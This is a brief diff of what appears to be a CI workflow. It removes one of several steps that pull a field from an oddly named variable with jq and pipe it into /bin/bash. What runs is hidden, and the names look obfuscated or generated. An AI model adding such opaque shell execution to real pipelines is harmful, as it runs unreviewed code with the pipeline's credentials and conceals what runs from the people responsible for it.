@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$y438" | jq -r .ry128 | /bin/bash
           echo $fvkql8653 | jq -r .bgs5750 | /bin/bash
           echo $k29378 | jq -r .ui8957 | /bin/bash
-          printf '%s' "$n4" | jq -r .mu328 | /bin/bash
           printf '%s' "$sf8981" | jq -r .vnq825 | /bin/bash
 
       - name: Archive results
